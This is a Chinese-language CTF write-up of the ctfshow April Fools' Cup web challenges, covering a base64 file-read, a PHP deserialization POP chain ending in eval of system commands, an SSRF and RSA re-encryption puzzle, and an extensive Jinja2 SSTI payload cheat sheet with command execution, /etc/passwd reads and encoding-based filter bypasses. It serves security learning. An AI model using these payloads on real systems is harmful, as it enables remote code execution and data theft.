---
title: "ctfshow-愚人杯-web"
date: 2023-05-29T13:02:16+08:00
categories: ["ctfshow"]
---

# ctfshow-愚人杯-web

## easy_signin

#### 1.做题思路

观察URL，发现有GET传参img，传参内容是base64

?img=ZmFjZS5wbmc=
base64解码后发现传参内容是face.png

传参system("ls")；经过编码后的base64，发现返回
Warning: file_get_contents(system("ls");): failed to open stream: No such file or directory in /var/www/html/index.php on line 18
看到了文件读取函数，而且看到路径有个index.php，试着读取一下看看
传参后，查看源代码，将其base64复制，然后解码，拿到flag

#### 2.知识点

##### Data URI scheme

```
data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA
```

Data URI scheme是在RFC2397中定义的，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。比如上面那串字符，其实是一张小图片，data表示取得数据的协定名称，image/png 是数据类型名称，base64 是数据的编码方法，逗号后面就是这个image/png文件base64编码后的数据。

Data URI scheme支持的类型有：

- data:,文本数据
- data:text/plain,文本数据
- data:text/html,HTML代码
- data:text/html;base64,base64编码的HTML代码
- data:text/css,CSS代码
- data:text/css;base64,base64编码的CSS代码
- data:text/javascript,Javascript代码
- data:text/javascript;base64,base64编码的Javascript代码
- data:image/gif;base64,base64编码的gif图片数据
- data:image/png;base64,base64编码的png图片数据
- data:image/jpeg;base64,base64编码的jpeg图片数据
- data:image/x-icon;base64,base64编码的icon图片数据

#### 3.payload

```
?img=aW5kZXgucGhw
// index.php，base64编码：aW5kZXgucGhw
```

## 被遗忘的反序列化

```php
<?php

# 当前目录中有一个txt文件哦
error_reporting(0);
show_source(__FILE__);
include("check.php");

class EeE{
    public $text;
    public $eeee;
    public function __wakeup(){
        if ($this->text == "aaaa"){
            echo lcfirst($this->text);
        }
    }

    public function __get($kk){
        echo "$kk,eeeeeeeeeeeee";
    }

    public function __clone(){
        $a = new cycycycy;
        $a -> aaa();
    }
    
}

class cycycycy{
    public $a;
    private $b;

    public function aaa(){
        $get = $_GET['get'];
        $get = cipher($get);
        if($get === "p8vfuv8g8v8py"){
            eval($_POST["eval"]);
        }
    }


    public function __invoke(){
        $a_a = $this -> a;
        echo "\$a_a\$";
    }
}

class gBoBg{
    public $name;
    public $file;
    public $coos;
    private $eeee="-_-";
    public function __toString(){
        if(isset($this->name)){
            $a = new $this->coos($this->file);
            echo $a;
        }else if(!isset($this -> file)){
            return $this->coos->name;
        }else{
            $aa = $this->coos;
            $bb = $this->file;
            return $aa();
        }
    }
}   

class w_wuw_w{
    public $aaa;
    public $key;
    public $file;
    public function __wakeup(){
        if(!preg_match("/php|63|\*|\?/i",$this -> key)){
            $this->key = file_get_contents($this -> file);
        }else{
            echo "不行哦";
        }
    }

    public function __destruct(){
        echo $this->aaa;
    }

    public function __invoke(){
        $this -> aaa = clone new EeE;
    }
}

$_ip = $_SERVER["HTTP_AAAAAA"];
unserialize($_ip); 

// clone关键字:用于克隆一个完全一样的对象，克隆之后两个对象互不干扰。
// __clone() 方法只会在对象被克隆的时候自动调用。
```

#### 1.做题思路

先看代码，前面是各种类，最下面有句反序列化代码

```
$_ip = $_SERVER["HTTP_AAAAAA"];
```

$ip = $SERVER["HTTP_AAAAAA"]; ：接收header头中 aaaaaa参数的值，然后将其反序列化。 

发现题目包含了check.php，尝试读取，利用w_wuw_w类

此类反序列化之前先触发wakeup这个方法，检测key中是否有关键字

把读取file的内容给key，结束时显示aaa，可以用引用把aaa变量和key变量绑定，让aaa和key的内容相同，从而看到文件内容。

```php
<?php
class w_wuw_w{
        public $aaa;
        public $key;
        public $file;
}

$a=new w_wuw_w();
$a->aaa=&$a->key;
$a->file="check.php"; 
echo serialize($a);
?>

# 标准输出：O:7:"w_wuw_w":3:{s:3:"aaa";N;s:3:"key";R:2;s:4:"file";s:9:"check.php";}
```

check.php的源码:

```php
function cipher($str) {

    if(strlen($str)>10000){
        exit(-1);
    }

    $charset = "qwertyuiopasdfghjklzxcvbnm123456789";
    $shift = 4;
    $shifted = "";

    for ($i = 0; $i < strlen($str); $i++) {
        $char = $str[$i];
        $pos = strpos($charset, $char);

        if ($pos !== false) {
            $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset);
            $shifted .= $charset[$new_pos];
        } else {
            $shifted .= $char;
        }
    }

    return $shifted;
}
```

发现函数cipher在类cycycycy中被调用，猜测是check.php是个加密脚本。

```php
if($get === "p8vfuv8g8v8py")
{
	eval($_POST["eval"]);
}
```

可以在类cycycycy得知，密文为p8vfuv8g8v8py

观察发现是简单的凯撒移位密码，可以利用在线工具或者脚本解密一下。

php解密脚本

```php
function decipher($str) {

    if(strlen($str)>10000){
        exit(-1);
    }
    
    $charset = "qwertyuiopasdfghjklzxcvbnm123456789";
    $shift = 4;
    $deciphered = "";
    
    for ($i = 0; $i < strlen($str); $i++) {
        $char = $str[$i];
        $pos = strpos($charset, $char);
    
        if ($pos !== false) {
            $new_pos = ($pos + $shift) % strlen($charset);
            $deciphered .= $charset[$new_pos];
        } else {
            $deciphered .= $char;
        }
    }
    
    return $deciphered;
    }
```

python解密脚本

```python
charset = 'qwertyuiopasdfghjklzxcvbnm123456789'
key = 'p8vfuv8g8v8py'
result = ''
for k in key:
    result += charset[(charset.index(k) + 4) % len(charset)]
print(result)
```

解密后明文:fe1ka1ele1efp

为了利用post传参，需要触发aaa()方法，从谁触发了aaa()方法来推导，倒着推

```
EeE的_clone方法触发cycycy的aaa,
w_wuw_w的__invoke方法触发EeE的__clone

如何调用__invoke方法？
__invoke() //当尝试将对象调用为函数时触发
__toString() //把类当作字符串使用时触发
__wakeup() //执行unserialize()，会先调用这个函数

gBoBg的_toString方法如果让aa为w_wuw_w类，则能触发wuw的_invoke，

如何触发gBoBg的_toString方法？
EeE的_wakeup方法能触发gBoBg的toString
EeE的text赋值为gBoBg

$a = new EeE();
$a ->text = new gBoBg(); // 触发了gBoBg的_toString方法
$a ->text ->coos = new w_wuw_w(); // 触发了w_wuw_w的__invoke方法
$a ->text ->file = "any"; 
echo serialize($a);
```

完整的php反序列化构造

```php
<?php
class EeE{
        public $text;
        public $eeee;
}
class gBoBg{
        public $name;
        public $file;
        public $coos;
}
class w_wuw_w{
        public $aaa;
        public $key;
        public $file;
}
class cycycycy{
        
}

$a = new EeE();
$a ->text = new gBoBg();
$a ->text ->file = "any"; 
$a ->text ->coos = new w_wuw_w();
echo serialize($a);

# 标准输出：O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";N;s:4:"file";s:3:"any";s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";N;s:3:"key";N;s:4:"file";N;}}s:4:"eeee";N;}
```

#### 2.知识点

##### 反序列化漏洞

反序列化漏洞的成因在于代码中的 `unserialize()` 接收的参数可控，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，利用对对象属性的篡改实现最终的攻击。

##### 利用手法

对象的序列化和反序列化只能是其他类的属性，篡改反序列化的字符串只能控制预先设置好的属性，如果想利用类里面的方法，需要利用魔术方法，魔术方法的调用是在该类的序列化或者反序列化的同时自动完成，不需要人工干预。因此只要类中出现了能利用的魔术方法，就能通过反序列化，控制其对象属性，从而实现对这些函数（方法）的操控。

##### 常见魔术方法

```
__wakeup() //执行unserialize()，会先调用这个函数
__sleep() //执行serialize()，会先调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```

##### 利用过程

1.寻找unserialize()函数的参数是否有可利用点；
2.寻找反序列化的目标，重点寻找存在 wakeup() 或 destruct() 魔术方法的类；
3.逐层查看该类在魔术方法中使用的属性和属性调用的方法，观察是否有可控的属性，可以实现在当前调用过程中触发；
4.找到要控制的属性之后，将要用到的代码部分复制下来，构造序列化。

##### PHP反序列化POP链

POP 面向属性编程(Property-Oriented Programing) ：从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击目的。

反序列化POP链是通过控制对象的属性来实现控制程序的执行流程，进而实现利用本身代码达到攻击目的。

#### 3.payload

```
bp抓包：
在header部分添加
AAAAAA:
O:7:"w_wuw_w":3:{s:3:"aaa";N;s:3:"key";R:2;s:4:"file";s:9:"check.php";}
得到check.php源码，其为加密脚本，利用已知密文，进行解密，得到fe1ka1ele1efp

最终构造payload：
GET:
?get=fe1ka1ele1efp
POST:
system("ls /");
system("tac /f1agaaa");
Header:
AAAAAA: O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";N;s:4:"file";s:3:"any";s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";N;s:3:"key";N;s:4:"file";N;}}s:4:"eeee";N;}
```

## easy_ssti

#### 1.做题思路

查看题目源码，下载压缩包app.zip，解压得到app.py

```python
from flask import Flask
from flask import render_template_string,render_template
app = Flask(__name__)

@app.route('/hello/')
def hello(name=None):
    return render_template('hello.html',name=name)
@app.route('/hello/<name>')
def hellodear(name):
    if "ge" in name:
        return render_template_string('hello %s' % name)
    elif "f" not in name:
        return render_template_string('hello %s' % name)
    else:
        return 'Nonononon'
```

发现了python的flask框架，需要访问/hello.html，拼接：/hello/{{payload}}进行注入

试一下{{1+1}}，页面返回2，证明代码执行成功，存在SSTI注入。

#### 2.SSTi注入

##### ssti漏洞原理

SSTI（server-side template injection)为服务端模板注入攻击，它主要是由于框架的不规范使用而导致的。

主要为python的一些框架，如 jinja2 mako tornado django flask、PHP框架smarty twig thinkphp、java框架jade velocity spring等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。

**当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑**。

##### flask的jinja2引擎利用手法

{{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞。

##### 常用的构造语句

```
无过滤

# 读文件
#读取文件类，<type ‘file’> file位置一般为40，直接调用
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()}}
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}} (python3)


#直接使用popen命令，python2是非法的，只限于python3
os._wrap_close 类里有popen
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}


#调用os的popen执行命令
#python2、python3通用
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls /flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{''.__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
#python3专属
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}


#调用eval函数读取
#python2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} 
{{"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')}}
#python3
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}} 
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']}}
{{"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


#调用 importlib类
{{''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()}}


#调用linecache函数
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}


#调用communicate()函数
{{''.__class__.__base__.__subclasses__()[128]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}


#写文件
写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。
{{"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')}}  ----python2的str类型不直接从属于属于基类，所以要两次 .__bases__
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').write('123456')}}


#通用 getshell
原理就是找到含有 __builtins__ 的类，然后利用。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

##### 有过滤——绕过 .

1.中括号[]绕过

可以利用 [ ]代替 . 的作用。

```
{{().__class__}} 可以替换为：{{()["__class__"]}}
举例：
{{()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()}}
```

2.attr()绕过

原生 JinJa2 的 `attr()` 函数——获取对象的属性。

```
{{().__class__}} 
可以替换为：
{{()|attr("__class__")}}
{{getattr('',"__class__")}}
举例：
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
```

##### 绕过单双引号

1.request绕过

flask中存在着`request`内置对象可以得到请求的信息，`request`可以用5种不同的方式来请求信息，我们可以利用它来传递参数绕过。

```
{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&arg1=open&arg2=/etc/passwd
request.args是flask中的一个属性,为返回请求的参数,把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。

若args被过滤了，还可以使用values来接受GET或者POST参数。

可根据题目过滤的东西动态调整方法来进行绕过
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
Cookie:arg1=open;arg2=/etc/passwd
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
post:arg1=open&arg2=/etc/passwd
```

2.chr绕过

使用GET请求，+号记得url编码，否则被当作空格处理。

```
{% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}
```

##### 绕过关键字

1.反转，使用切片将逆置的关键字顺序输出，进而达到绕过。

```
""["__cla""ss__"]
"".__getattribute__("__cla""ss__")
反转
""["__ssalc__"][::-1]
"".__getattribute__("__ssalc__"[::-1])
```

2.+号，利用"+"进行字符串拼接，绕过关键字过滤。

```
{{()['__cla'+'ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev'+'al']("__im"+"port__('o'+'s').po""pen('whoami').read()")}}
```

3.join拼接，利用join()函数来绕过关键字过滤

```
{{[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()}}
```

4.利用引号绕过，以用“或”的形式来绕过：`fl""ag``fl''ag`。

```
{{[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()}}
```

5.使用str原生函数replace替换，将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。

```
{{().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()}}
```

6.ascii转换，将每一个字符都转换为ascii值后再拼接在一起。

```
"{0:c}".format(97)='a'
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
```

7.16进制编码绕过

```
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"

例子：
{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').popen('whoami').read()}}
```

8.base64编码绕过，python2，可以利用base64进行绕过，python3没有decode方法，所以不能用该方法绕过。

```
"__class__"==("X19jbGFzc19f").decode("base64")

例子：
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
等价于
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

9.unicode编码

```
{%print((((lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))|attr("\u0067\u0065\u0074")("os"))|attr("\u0070\u006f\u0070\u0065\u006e")("\u0074\u0061\u0063\u0020\u002f\u0066\u002a"))|attr("\u0072\u0065\u0061\u0064")())%}
lipsum.__globals__['os'].popen('tac /f*').read()
```

10.Hex编码

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}
等价于
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

11.8进制编码

```
{{''['\137\137\143\154\141\163\163\137\137'].__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\137\137\151\155\160\157\162\164\137\137']('os').popen('whoami').read()}}
```

##### *对于这些编码进行绕过，就是将是字符串的关键字进行编码，然后进行对应解码即可，rot13等其他编码也是同理。*

12.利用chr函数，无法直接使用chr函数，需要通过`__builtins__`找

```
{% set chr=url_for.__globals__['__builtins__'].chr %}
{{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
```

13.在jinja2可以使用~进行拼接

```
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
```

##### 绕过init

可以用`__enter__`或`__exit__`替代

```
{{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
 
{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

#### 3.payload

```
payload1：hex编码绕过，hex编码了cat /f*
{{"ge".__class__.__base__.__subclasses__()[133].__init__.__globals__['__builtins__'].__import__('os').popen('\x63\x61\x74\x20\x2f\x66\x2a').read()}} 

payload2：利用cd..，绕过/
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cd ..&&cat *lag').read()")}}

payload3：有点像参数逃逸的意思
{{ "".__class__.__base__ .__subclasses__()[132].__init__.__globals__['popen'](request.args.get("ctfshow")).read()}}ge?ctfshow=cat /flag 

payload4：base64编码绕过
{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('echo "Y2F0IC9mbGFn"|base64 -d|sh').read()}}
```

## 暗网聊天室

#### 1.做题思路

![](/images/暗网聊天室-1.png)

##### 1.先进行一波信息搜集

- 点进博客链接，直接就是出题师傅的博客
- 提示了本地访问 9999 端口，可能存在SSRF 
-  “点我进入宇宙商城” 链接可以访问

- 发现了flag格式ctfshow{}，flag可能存在于聊天室的某些宣传中
- 点了上面的选项，发现只有插件可以用

##### 2.“点我进入宇宙商城” 链接，回显了自己的IP

```
页面内容：

抱歉，本网站因被黑客攻击正在抢修中...

Your IP：2.56.12.89
您的访问已记入日志。
```

##### 3.点开插件，发现了新的东西

![](/images/暗网聊天室-2.png)

![](/images/暗网聊天室-3.png)

![](/images/暗网聊天室-4.png)

继续一波信息搜集

- 最上面发现了私钥，原始数据，加密数据

- 有一个三层代理的基本原理图
- 还有一个加密脚本
- 通过脚本观察到了长度128一加密，并且是utf-8编码加密
- 看到之前的宣传语，复制，放在文本文件，发现长度为134>128
- 复制原始数据，到文本文件，发现长度为18944
- 利用加密脚本，先自己跑一下
- ```python
  from Crypto.PublicKey import RSA
  from Crypto.Cipher import PKCS1_v1_5
  
  
  # 加密
  def encrypt(plaintext, public_key):
      cipher = PKCS1_v1_5.new(RSA.importKey(public_key))
  
      ciphertext = ''
      for i in range(0, len(plaintext), 128):
          ciphertext += cipher.encrypt(plaintext[i:i + 128].encode('utf-8')).hex()
          print(len(ciphertext))
  
      return ciphertext
  
  
  key = RSA.generate(2048)
  public_key1 = key.publickey().export_key()
  private_key1 = key.export_key()
  
  encrypt('Get ctfshow{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} for discover dark web secrets. High quality, low price. Perfect for aspiring hackers!',public_key1)
  
  # 运行结果
  512
  1024
  ```

##### 4.访问robots.txt

因为“点我进入宇宙商城” 链接，回显了自己的IP，加密也同意利用了 IP，可能IP会是突破点，查看 robots.txt

```
页面内容：
user-agent: *
Disallow: shop.py.bak
```

看到了shop.py.bak，继续访问一下

```python
页面内容：
if request.args.get('api', None) is not None:
        api = request.args.get('api')
        if re.search(r'^[\d\.:]+$', api):
            get = requests.get('http://'+api)
            html += '<!--'+get.text+'-->'
    return html
```

想到本地访问 9999 端口 /shop?api=127.0.0.1:9999 

```html
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
非常抱歉，本网站因被黑客攻击正在抢修中...<br>
<br>
Your IP：2.56.12.89<br>
您的访问已记入日志。<br>
    <!--你先好好看看自己私钥啥格式，别漏了"\n"
"public_key1": "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmz4yT2QVwRhVzGQ0FGm6
JQWgIxjsVImyeX8a2D61BPLzEBz8Z8RXaNDzmTIzG8itsCptyXcSMhd8bWbKKpdX
xtwAdmUv85aR07XEEX4h/WgTsZLxZorQls5OUwGbRQ9vtzx79u4/mA5ZJ9cyBsMI
KLScKf5eH+1nfHqqzlSJXNu+S15obPRVQYAVnXfnygJmq7O33+yYv947e5Gih6ky
PisXCKWUOAzAYP8qe1yqS4VWxnIgxm1Ozc7BvgJvxhilBIHnligmlEQaSEHxCW07
ZvJXjTuOyY7VoH5NgmW9c3mv9udvCCFokvB+PCNOej9FUezgUs1sAb4PpAmZLJEU
JwIDAQAB
-----END PUBLIC KEY-----", "
public_key2": "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2zfAOrCxswYCYSt6hVJW
69PhbhRmTD4aDXgThqwRE2Ev16S0uIHSuon7CnkyREiu7FIpG0UBPKAdh2NDZba7
H9UqPgHjHCeikRlQoBUHordJdJDnaQSOf+/u+feKs3IvY+CuHGAP45h57WHovSfb
5NSHGA1VGO/9Zl6WJVjMwY0dNvtdDLYycezUeWSRUX+YVZhMOjWQ1xoEwFwo+qWv
3np+lK3m4Po4I4kN4bdvz14ls5jpzkthIOu1lS6QxSURdA3yms3OWWcWhrZdsEok
c+1eB84+uzohllO8+ZHE8LXLAnhKjANGJWnwKsiaVq+gl49yMyU8S52TyYd9Mq/z
7wIDAQAB
-----END PUBLIC KEY-----", "
public_key3": "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArJXS3k546UPXPpQ/TVjT
hX2SUbr+s4ItsRUSUogo558qmdWg8EnjwaOo6Pi6cY2aWb1F2Fhsz17NoMYQ6InW
lZqSR6k1uwxbPZ/xK929b/q+6paxoacU05Hopor3LFq0Uw1rf7ZLp22BTbHyFVID
xMe/pTuiB1BxlAQiKQ10W5fcJWuuD1E8kFGj37TtlKtu+hPspgC0z8vNnzyI6Z7k
1JpttlNsofQ2AZTziglwtVbrSJJB6R5kCVIKFlpDjdVPH8aEqISqXlsIikS7yNAk
4OZLPO0iA4PhLh5DvbczdJB+wBU3HVr/QRwHf7AmI7c1+PS0DtrBrvVFyk6ZhNTt
dwIDAQAB
-----END PUBLIC KEY-----"-->
```

注释里面有 3 个公钥，可以自己利用脚本进行加密，

通过该网站的公钥 1 和自己的私钥 1 进行加解密，可行，

说明该网站用户 A 如果对自己 IP 进行加密，然后替换“解密后的数据“中的用户B的IP，最终明文会发送给自己。

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from flask import Flask, request, abort
# 加密
def encrypt(plaintext, public_key):
 cipher = PKCS1_v1_5.new(RSA.importKey(public_key))
 ciphertext = ''
 for i in range(0, len(plaintext), 128):
 ciphertext += cipher.encrypt(plaintext[i:i+128].encode('utf8')).hex()
 return ciphertext
IP = '2.56.12.89'
plaintext_half = '拦截的 解密后的数据'
# 公钥开头、结尾有俩\n
public_key2 = '-----BEGIN PUBLIC KEY-----\nxxx\n-----END PUBLIC KEY--
---'
public_key3 = '-----BEGIN PUBLIC KEY-----\nxxx\n-----END PUBLIC KEY--
---'
IP_ciphertext = encrypt(IP, public_key3)
IP_ciphertext = encrypt(IP_ciphertext, public_key2)
# 替换最终 IP
plaintext_half_new = plaintext_half[:2048] + IP_ciphertext + 
plaintext_half[4096:]
print(plaintext_half_new)
```

将新生成的数据替换“解密后的数据”，利用post传参发送，然后访问，获取 FLAG，因为最终传递的 IP 是自己。

```
# 新生成的解密后数据
624f40b736d3cc973bb4ff63266fd583418692950b182aa482f4a12fa4898e4fa1f281e1996323a5f3ffa7e7a2a2a410004e7d881a3c706c731b47955a68d9dcb2b27d3dab8ee7edc42aaae68c0897b8a53ede59c2b90addcba162279a68bed2eb0babb30dd4dd765563005fd0146ae950c532742b474b05e62344ce8ab65fddbd9da8f3e5cb9c9087b00dd0e432511b89e4889efc16bc8cfdf75348382a8e0b900292897f90bf92479554b68606f788e4725cf31f67848472652c1b6c2433e17f7d19a5c90e6b7ef1650773f0bd9bb46d0efddbbb6b70234f69711a50fe8b63fd294c236cb0eae075116348de5000c7594a5dcfe207e3a73fd0f5b468f400e4547b054da58f6493f2bf77f72f6160d301f10355da74957a13fbe952cc41442c06b96a302d4ded356e5e48a78c03c67434992a9a5069f5529d1c4400c65be639c75c0aba8571a2b6456d07223df26d0857af6efd9214224b1dc3faca135c7bf628c220b12fed7ac95ad676b7b70ae215f5b33cb9fc93730baf38723aa1aa9163bf93c70e7cc37f9c69d804b0715fa3901c6d9e7022d5635b6108ed7688848f27aa5b6cc7e7e20a2a614c610f4493a5e76b50e7717cf97f1ffa1ee106acdd77e246638f386cb0e1a5d9fd4b249a1d2c9423a90636cfa11d58c171a746554916bae0b3c6fb0a469f5ae9c806febb18946adc15df93b1027e4c52c479c1fa57dfe49d2466f3d2e5e917bed4948423b6109f85d30bd94aa4d4e3c5d271db4c9dad8a5e56b6b536515d4596441bc23439f7e2cc4ea57ddf8afdd49937a4cedd0eda267647fdf73701d4dc96f7ff2d0888699a14f5da7eb421b3ed15dc9f0f151845df566ef40d0220dbb3317a3f5dc755060c63d930224df991bdd2a462affbc46100d8b2734695838bda5f4d8f75132597c291123816d7c158fdb893daa568016fda769c690d14cbff5778faea0b21519473f565c4920f1cffd09646ea858bbd908189d6bfd422a2ba8d27e83d4e99aeabb45983e0d5242ed6c4433f369d93df2b6ef92b69914b1b349f39119634568a55ede90fa36f320192124f5c65e4975919fdc22babae4135d3b9a375db27a6d46ee027fd291fa78d3cbc14ec24b89969c364ce56fbebe8ba68589393ffa55cacfe6e9bef0d711e8cacd4fe3339e2aa76c0652e8634fe0d3b19a22e3d4f0baf79f43071c059ce0f85f03567c90b544d225ee97ee2dba9c356dd8db6fc839f55c66318f5d7ba58c1e62e891866a0dc280403c993f